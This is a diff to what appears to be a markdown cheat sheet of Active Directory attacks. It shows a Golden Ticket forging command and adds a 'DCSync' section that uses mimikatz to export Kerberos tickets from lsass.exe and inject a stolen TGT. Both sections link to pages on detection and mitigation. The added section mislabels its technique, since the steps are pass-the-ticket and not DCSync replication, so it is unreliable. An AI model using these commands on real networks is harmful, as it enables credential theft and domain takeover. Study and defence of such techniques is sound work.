@@ -33,3 +33,13 @@ The Golden Ticket recipe contains 3 elements:
 2) Forge Kerberos tickets like TGT using the Golden Ticket (```krbtgt``` Password Hash) with tools like ```mimikatz``` or ```impacket``` (example: ```mimikatz.exe "kerberos::golden /domain:[DOMAIN] /sid:[SID] /aes256:[KRBTGT hash] /user:NonExistentUser /groups:513,2668 /ptt"```)
 
 More information, demonstration and ways to detect, mitigate and respond: https://attack.stealthbits.com/how-golden-ticket-attack-works
+
+
+## DCSync
+
+Using the Directory Replication Service (DRS) Remote Protocol to replicate data (including credentials) from Active Directory.
+
+1) Extract Kerberos tickets from ```lsass.exe``` (by using ```mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"``` for example)
+2) Inject the stolen TGT into your own session (by using ```mimikatz.exe kerberos::ptt```)
+
+More information, demonstration and ways to detect, mitigate and respond: https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync
